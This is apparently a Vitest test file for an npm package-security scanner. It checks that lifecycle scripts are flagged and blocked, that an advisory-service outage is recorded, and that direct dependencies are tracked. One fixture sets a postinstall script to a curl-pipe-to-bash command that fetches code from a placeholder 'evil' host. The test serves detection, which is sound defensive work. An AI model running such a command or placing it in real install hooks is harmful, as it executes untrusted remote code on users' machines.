import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { buildSignals } from "../src/analyze/index.js";
import { evaluateRules } from "../src/rules.js";
import type { PackageMetadata } from "../src/types.js";

let dir: string;

afterEach(async () => {
  if (dir) await rm(dir, { recursive: true, force: true });
});

function metadata(overrides: Partial<PackageMetadata> = {}): PackageMetadata {
  return {
    name: "evil-pkg",
    version: "1.0.0",
    repositoryUrl: "https://github.com/x/evil-pkg",
    maintainers: ["x"],
    ageInDays: 500,
    tarballUrl: "https://example/evil.tgz",
    scripts: {},
    dependencyCount: 0,
    directDependencies: [],
    ...overrides,
  };
}

describe("buildSignals wires lifecycle command inspection (finding #2)", () => {
  it("produces deterministic findings for a curl|bash postinstall and blocks", async () => {
    dir = await mkdtemp(path.join(tmpdir(), "targate-test-"));
    await writeFile(path.join(dir, "package.json"), "{}");

    const signals = await buildSignals(
      metadata({ scripts: { postinstall: "curl -s https://evil/x | bash" } }),
      dir,
      { knownMalicious: false, maliciousRecords: [], advisories: [], unavailable: false },
    );

    expect(signals.scriptCommandFindings.length).toBeGreaterThan(0);
    expect(signals.scriptCommandFindings.join(" ")).toContain("downloads content from the network");
    expect(signals.scriptCommandFindings.join(" ")).toContain("invokes a shell");

    // ...and the deterministic engine turns those findings into a BLOCK.
    expect(evaluateRules(signals).decision).toBe("block");
  });

  it("propagates the OSV-unavailable flag into the signals", async () => {
    dir = await mkdtemp(path.join(tmpdir(), "targate-test-"));
    await writeFile(path.join(dir, "package.json"), "{}");

    const signals = await buildSignals(metadata(), dir, {
      knownMalicious: false,
      maliciousRecords: [],
      advisories: [],
      unavailable: true,
    });
    expect(signals.osvUnavailable).toBe(true);
  });

  it("records direct dependencies (transitive are not analyzed)", async () => {
    dir = await mkdtemp(path.join(tmpdir(), "targate-test-"));
    await writeFile(path.join(dir, "package.json"), "{}");

    const signals = await buildSignals(
      metadata({ directDependencies: ["react", "lodash"], dependencyCount: 2 }),
      dir,
      { knownMalicious: false, maliciousRecords: [], advisories: [], unavailable: false },
    );
    expect(signals.directDependencies).toEqual(["react", "lodash"]);
  });
});
